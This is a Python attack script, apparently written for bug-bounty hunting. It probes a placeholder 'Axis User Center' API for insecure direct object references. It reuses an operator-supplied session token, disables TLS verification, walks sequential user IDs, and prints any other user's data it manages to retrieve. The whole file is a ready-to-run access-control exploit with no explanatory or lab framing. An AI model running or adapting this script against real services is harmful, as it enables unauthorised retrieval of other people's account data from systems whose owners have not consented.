import httpx
import warnings

warnings.filterwarnings("ignore")

BASE_URL = "https://yourtarget.com"

def live_hunt():
    print("[*] ENGAGING LIVE BUG BOUNTY HUNT MODE...")
    print("[*] Target: Axis User Center API (yourtarget.com)")
    
    # Prompt operator for active session cookie or token if available
    session_cookie = input("[?] Enter active session cookie/token (leave blank if testing raw enumeration): ").strip()
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*"
    }
    
    if session_cookie:
        headers["Cookie"] = f"session={session_cookie}"
        headers["Authorization"] = f"Bearer {session_cookie}"
        print("[+] Active session token injected into request headers.")
    else:
        print("[!] No session token provided. Enumerating public vs protected API boundaries...")
        
    client = httpx.Client(verify=False, timeout=10.0, follow_redirects=False)
    
    # Test sequential user and organization IDs for IDOR / BOLA
    print("\n[*] Fuzzing object identifiers across live endpoints...")
    for user_id in range(1, 10):
        url = f"{BASE_URL}/user-center/api/v1/users/{user_id}"
        try:
            res = client.get(url, headers=headers)
            print(f"    -> GET {url} | Status: {res.status_code} | Length: {len(res.text)}")
            if res.status_code == 200 and "html" not in res.text.lower():
                print(f"        [***] BINGO! LIVE IDOR FOUND ON USER ID {user_id}: {res.text[:200]}")
        except httpx.RequestError as e:
            print(f"    -> Request Error: {e}")
            
    client.close()
    print("\n[*] Live hunt cycle complete.")

if __name__ == "__main__":
    live_hunt()
